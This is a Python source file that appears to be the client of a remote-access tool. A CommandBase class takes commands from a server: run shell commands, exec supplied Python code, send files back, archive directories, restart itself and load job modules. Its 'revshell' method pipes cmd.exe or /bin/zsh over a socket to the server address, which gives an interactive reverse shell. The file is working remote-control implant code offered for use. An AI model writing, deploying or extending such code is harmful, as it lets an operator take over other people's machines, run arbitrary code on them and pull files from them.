import contextlib
import glob
import inspect
import io
import locale
import os
import socket
import subprocess
import sys
import threading
import time

from client.config.config import SERVER_ADDR, JOB_PATH
from client.commands.CommandBase import CommandBase
from client.util.decorator import desc
from common.util import format_dict, logger


class CommonCommands(CommandBase):
    """所有平台通用的命令"""

    def read_stream(self, stream):
        while True:
            # 从输入流读取一行数据
            line = stream.readline()
            # 如果没有更多数据可读取，则跳出循环
            if not line:
                break
            # 将读取的字节转换为字符串，并去除行尾的换行符
            self._send_interim_result(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'))

    @desc('change directory')
    def cd(self, path):
        """跨平台的目录切换命令"""
        try:
            os.chdir(path)
            return 1, ""
        except Exception as e:
            return 0, str(e)

    @desc('execute shell command')
    def shell(self, command):
        """跨平台的shell命令执行"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            if result.returncode == 0:
                return 1, result.stdout
            else:
                return 0, result.stderr
        except Exception as e:
            return 0, str(e)

    @desc('execute shell command and read from streams in parallel')
    def read(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout_thread = threading.Thread(target=self.read_stream, args=(cmd.stdout,))
        stderr_thread = threading.Thread(target=self.read_stream, args=(cmd.stderr,))
        stdout_thread.daemon = True
        stderr_thread.daemon = True
        stdout_thread.start()
        stderr_thread.start()
        # 等待命令完成
        cmd.wait()
        time.sleep(0.1)
        self._send_final_result(1, "Command completed successfully")

    @desc('download file')
    def download(self, filename):
        if os.path.isfile(filename):
            self.socket.send_result(self.command_id, 1, 'Preparing to send file', eof=0)
            self.socket.send_result(self.command_id, 1, 'File length is {}'.format(os.path.getsize(filename)), eof=0)
            self.socket.send_file(self.command_id, filename)
        else:
            return 0, 'File does not exist'

    @desc('execute python code')
    def pyexec(self, code, kwargs=None):
        if kwargs is None:
            kwargs = {}
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, kwargs)
        return 1, f.getvalue()

    @desc('show this help')
    def help(self):
        methods = {name: method for name, method in
                   inspect.getmembers(self, lambda x: inspect.isfunction(x) or inspect.ismethod(x))
                   if hasattr(method, 'help')}
        return 1, format_dict({name: method.help for name, method in methods.items()})

    @desc('create a zip archive')
    def zip(self, dir_name):
        import pathlib
        import shutil
        import tempfile
        tempdir = tempfile.mkdtemp()
        dir_name = os.path.abspath(dir_name)
        if not os.path.isdir(dir_name):
            return 0, f'Directory does not exist: {dir_name}'
        zip_name = os.path.basename(dir_name)
        pardir = pathlib.Path(dir_name).resolve().parent
        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
                                       base_dir=os.path.basename(dir_name))
        return 1, f'Archive created: {filename}'

    @desc('extract files from a zip archive')
    def unzip(self, zip_name):
        import shutil
        zip_name = os.path.abspath(zip_name)
        if not os.path.isfile(zip_name):
            return 0, f'File does not exist: {zip_name}'
        shutil.unpack_archive(zip_name, os.getcwd())
        return 1, f'Archive extracted to {os.getcwd()}'

    @desc('close connection')
    def kill(self):
        self.socket.close()
        sys.exit(0)

    @desc('reset connection')
    def reset(self):
        if os.name == 'nt':
            from client.util.win32util import get_executable_path
            exec_path = get_executable_path()
            subprocess.Popen(exec_path)
        elif os.name == 'posix':
            executable = os.path.realpath(sys.executable)
            argv = os.path.realpath(''.join(sys.argv))
            exec_path = f'{executable} {argv}'
            subprocess.Popen(exec_path, shell=True)
        self.socket.close()
        sys.exit(0)

    @desc('start a interactive reverse shell')
    def revshell(self, arg):

        interpreter = None
        if os.name == 'nt':
            interpreter = 'cmd.exe'
        elif os.name == 'posix':
            interpreter = '/bin/zsh'
        if not interpreter:
            self._send_final_result(0, 'Interpreter not found', 1)

        self._send_final_result(1, 'Reverse shell thread being started', 1)

        p = subprocess.Popen(interpreter, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        s = socket.socket()
        s.connect((SERVER_ADDR[0], int(arg.strip())))

        def send():
            while p.poll() is None:
                o = os.read(p.stdout.fileno(), 1024)
                s.send(o)
            logger.info('Sending thread has been terminated')
            s.close()

        def recv():
            try:
                while 1:
                    i = s.recv(1024)
                    os.write(p.stdin.fileno(), i)
            finally:
                logger.info('Receiving thread has been terminated')

        threading.Thread(target=send, daemon=True).start()
        threading.Thread(target=recv).start()

    @desc('start a job in new thread')
    def start_job(self, job_name: str):
        """
        Start a job in a new thread. If no job name is provided, list all available jobs.

        Args:
            job_name: Name of the job to start (with or without .py extension)

        Returns:
            Tuple: (status_code, message) if listing jobs
        Raises:
            ValueError: For invalid operations
            RuntimeError: For job execution issues
        """

        job_name = job_name.strip()

        # List available jobs if no argument provided
        if not job_name:
            job_dir = os.path.join(JOB_PATH)
            modules = [
                os.path.relpath(f, job_dir).replace('\\', '/')
                for f in glob.iglob(os.path.join(job_dir, '**/*.py'), recursive=True)
            ]
            return 1, '\n'.join(modules)

        # Normalize job name
        if not job_name.endswith('.py'):
            job_name += '.py'

        base_name = os.path.splitext(os.path.basename(job_name))[0]

        # Validate before execution
        if base_name == 'module':
            raise ValueError('Base module cannot be executed directly')

        if base_name in self.jobs and self.jobs.get(base_name).is_running:
            raise RuntimeError(f'Job "{base_name}" is already running')

        self._send_interim_result(1, f'Preparing to start job: {base_name}')

        try:
            # Start job execution flow
            job_instance = self._dynamic_import(job_name)
            job_thread = threading.Thread(
                target=job_instance.run,
                name=f'JobThread-{base_name}'
            )
            job_thread.start()

            self._send_final_result(
                1,
                f'Job thread started (name: {job_thread.name})\n'
                f'Use "stop_job {base_name}" to stop execution'
            )
        except Exception as e:
            raise RuntimeError(f'Failed to start job "{base_name}": {str(e)}')

    @desc('stop a running job')
    def stop_job(self, job_name: str):
        """
        Stop a running job.

        Args:
            job_name: Name of the job to stop (with or without .py extension)

        Returns:
            Tuple: (status_code, message)
        """
        job_name = job_name.strip()

        # List available jobs if no argument provided
        if not job_name:
            return 1, '\n'.join(self.jobs)

        # Normalize job name
        if job_name.endswith('.py'):
            job_name = job_name[:-3]

        if job_name not in self.jobs:
            return 0, f'Job "{job_name}" is not currently running'

        job_instance = self.jobs[job_name]
        if job_instance.is_running:
            job_instance.stop()

        self.jobs.pop(job_name)
        return 1, f'Successfully stopped job: {job_name}'
